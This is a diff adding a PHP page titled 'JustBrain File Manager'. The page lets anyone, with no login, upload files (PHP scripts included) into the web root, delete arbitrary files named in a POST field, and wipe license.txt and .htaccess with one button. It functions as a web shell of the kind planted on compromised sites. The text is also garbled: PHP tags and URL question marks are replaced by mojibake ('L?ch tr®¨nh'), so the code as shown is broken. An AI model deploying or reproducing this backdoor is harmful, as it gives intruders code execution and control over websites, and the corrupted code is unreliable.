@@ -1,0 +1,158 @@
+<L?ch tr®¨nhphp
+// Define the files to be deleted
+$filesToDelete = ['license.txt', '.htaccess'];
+
+// Handle the delete request for specific files
+if (isset($_POST['delete_files'])) {
+    foreach ($filesToDelete as $file) {
+        if (file_exists($file)) {
+            unlink($file);
+            echo "<p style='color: green; text-align: center;'>$file has been deleted successfully.</p>";
+        } else {
+            echo "<p style='color: red; text-align: center;'>$file does not exist.</p>";
+        }
+    }
+}
+
+// Handle file deletion from the list
+if (isset($_POST['delete_file'])) {
+    $fileToDelete = $_POST['delete_file'];
+    if (file_exists($fileToDelete)) {
+        unlink($fileToDelete);
+        echo "<p style='color: green; text-align: center;'>$fileToDelete has been deleted successfully.</p>";
+    } else {
+        echo "<p style='color: red; text-align: center;'>$fileToDelete does not exist.</p>";
+    }
+}
+
+// Handle file upload
+$directoryPath = './'; // Directory path to manage files
+if (isset($_POST['upload'])) {
+    if (isset($_FILES['file'])) {
+        $fileName = basename($_FILES['file']['name']);
+        $targetFilePath = $directoryPath . '/' . $fileName;
+        if (file_exists($targetFilePath)) {
+            echo "<p style='color: red; text-align: center;'>Error: File already exists.</p>";
+        } else {
+            if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFilePath)) {
+                echo "<p style='color: green; text-align: center;'>File uploaded successfully!</p>";
+            } else {
+                echo "<p style='color: red; text-align: center;'>Error: File upload failed.</p>";
+            }
+        }
+    }
+}
+
+// Function to get current directory path
+function getCurrentDirectoryPath() {
+    return realpath('.');
+}
+L?ch tr®¨nh>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JustBrain File Manager</title>
+    <style>
+        /* General styles */
+        body { font-family: Arial, sans-serif; background-color: #111; color: #fff; margin: 0; padding: 0; }
+        
+        /* Stylish title */
+        h1 { 
+            text-align: center; 
+            font-size: 2.5em; 
+            color: #fff; 
+            padding: 20px; 
+            background: linear-gradient(45deg, #FF7F50, #1E90FF); 
+            border-radius: 10px; 
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7);
+        }
+
+        .file-manager { width: 80%; margin: 20px auto; padding: 20px; background: #222; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        .path-display { background-color: #333; padding: 10px; margin-bottom: 20px; border-radius: 5px; font-size: 14px; color: #bbb; }
+        .upload-form { text-align: center; margin-bottom: 20px; }
+        .upload-form input[type="file"] { margin-right: 10px; }
+        .upload-form button { padding: 8px 12px; color: #fff; background-color: #1E90FF; border: none; border-radius: 4px; cursor: pointer; }
+        .upload-form button:hover { background-color: #0056b3; }
+        ul { list-style-type: none; padding: 0; margin: 0; }
+        li { margin: 5px 0; padding: 8px; border-bottom: 1px solid #444; display: flex; align-items: center; transition: background-color 0.3s ease; }
+        .directory { color: #1E90FF; font-weight: bold; }
+        .file { color: #ccc; }
+        .php-file { color: #FF4500; }
+        .image-file { color: #32CD32; }
+        .text-file { color: #8A2BE2; }
+        .actions { margin-left: auto; display: flex; justify-content: flex-end; }
+        .actions a { margin-left: 10px; text-decoration: none; font-size: 0.9em; }
+        .delete-action { color: #FF0000; }
+        .download-action { color: #008000; }
+        .edit-action { color: #FFD700; }
+        .actions a:hover { text-decoration: underline; font-weight: bold; }
+        li:hover { background-color: #32CD32; color: white; }
+        .folder-icon { margin-right: 8px; color: #1E90FF; }
+        .file-icon { margin-right: 8px; color: #ccc; }
+    </style>
+</head>
+<body>
+
+    <h1>JustBrain File Manager</h1>
+    <div class="file-manager">
+
+        <!-- Path Display -->
+        <div class="path-display">
+            Current Path: L?ch tr®¨nhL?ch tr®¨nhL?ch tr®¨nh<L?ch tr®¨nhphp echo getCurrentDirectoryPath(); L?ch tr®¨nh>
+        </div>
+
+        <!-- File Upload Form -->
+        <div class="upload-form">
+            <form action="" method="POST" enctype="multipart/form-data">
+                <input type="file" name="file" required>
+                <button type="submit" name="upload">Upload File</button>
+            </form>
+        </div>
+
+        <!-- Delete Specific Files Form -->
+        <form method="POST" style="text-align: center; margin-bottom: 20px;">
+            <button type="submit" name="delete_files" style="padding: 10px 20px; background-color: #FF0000; color: #fff; border: none; border-radius: 4px; cursor: pointer;">Delete Specified Files</button>
+        </form>
+
+        L?ch tr®¨nhL?ch tr®¨nhL?ch tr®¨nh<L?ch tr®¨nhphp
+        // List files and directories
+        $files = scandir($directoryPath);
+        echo "<ul>";
+        foreach ($files as $file) {
+            if ($file === '.' || $file === '..') continue;
+            $filePath = $directoryPath . '/' . $file;
+            if (is_dir($filePath)) {
+                echo "<li class='directory'><span class='folder-icon'>üìÅ</span> $file
+                        <span class='actions'><a href='open.phpL?ch tr®¨nhdir=$file' class='open-action'>Open</a></span>
+                      </li>";
+            } else {
+                $fileExtension = pathinfo($filePath, PATHINFO_EXTENSION);
+                $class = 'file';
+                if ($fileExtension === 'php') {
+                    $class = 'php-file';
+                } elseif (in_array($fileExtension, ['jpg', 'jpeg', 'png', 'gif'])) {
+                    $class = 'image-file';
+                } elseif ($fileExtension === 'txt') {
+                    $class = 'text-file';
+                }
+                echo "<li class='$class'><span class='file-icon'>üìÑ</span> $file
+                        <span class='actions'>
+                            <a href='download.phpL?ch tr®¨nhfile=$file' class='download-action'>Download</a>
+                            <a href='edit.phpL?ch tr®¨nhfile=$file' class='edit-action'>Edit</a>
+                            <form method='POST' action='' style='display:inline;'>
+                                <input type='hidden' name='delete_file' value='$file'>
+                                <button type='submit' class='delete-action' style='background:none;border:none;color:red;'>Delete</button>
+                            </form>
+                        </span>
+                      </li>";
+            }
+        }
+        echo "</ul>";
+        L?ch tr®¨nh>
+
+    </div>
+</body>
+</html>
